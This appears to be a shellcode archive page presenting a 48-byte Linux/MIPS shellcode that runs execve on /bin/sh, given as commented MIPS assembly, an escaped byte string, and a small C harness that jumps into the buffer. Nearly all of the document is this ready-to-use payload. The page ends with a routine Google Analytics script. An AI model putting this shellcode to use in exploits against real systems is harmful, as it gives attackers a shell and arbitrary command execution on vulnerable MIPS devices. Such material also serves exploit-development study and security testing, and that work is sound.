<html><head><title>Linux/mips - execve /bin/sh - 48 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* Title:  Linux/MIPS - execve /bin/sh - 48 bytes
   Date:   2011-11-24
   Author: rigan - imrigan [at] gmail.com
    
        .text
        .global __start
__start:
        slti $a2, $zero, -1
        li $t7, 0x2f2f6269
        sw $t7, -12($sp)
        li $t6, 0x6e2f7368
        sw $t6, -8($sp)
        sw $zero, -4($sp)
        la $a0, -12($sp)
        slti $a1, $zero, -1
        li $v0, 4011
        syscall 0x40404
*/
 
#include &lt;stdio.h&gt;
 
 
char sc[] = {
        &quot;\x28\x06\xff\xff&quot;        /* slti    a2,zero,-1   */
        &quot;\x3c\x0f\x2f\x2f&quot;        /* lui     t7,0x2f2f    */
        &quot;\x35\xef\x62\x69&quot;        /* ori     t7,t7,0x6269 */
        &quot;\xaf\xaf\xff\xf4&quot;        /* sw      t7,-12(sp)   */
        &quot;\x3c\x0e\x6e\x2f&quot;        /* lui     t6,0x6e2f    */
        &quot;\x35\xce\x73\x68&quot;        /* ori     t6,t6,0x7368 */
        &quot;\xaf\xae\xff\xf8&quot;        /* sw      t6,-8(sp)    */
        &quot;\xaf\xa0\xff\xfc&quot;        /* sw      zero,-4(sp)  */
        &quot;\x27\xa4\xff\xf4&quot;        /* addiu   a0,sp,-12    */
        &quot;\x28\x05\xff\xff&quot;        /* slti    a1,zero,-1   */
        &quot;\x24\x02\x0f\xab&quot;        /* li      v0,4011      */
        &quot;\x01\x01\x01\x0c&quot;        /* syscall 0x40404      */
};
 
void main(void)
{
       void(*s)(void);
       printf(&quot;size: %d\n&quot;, strlen(sc));
       s = sc;
       s();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
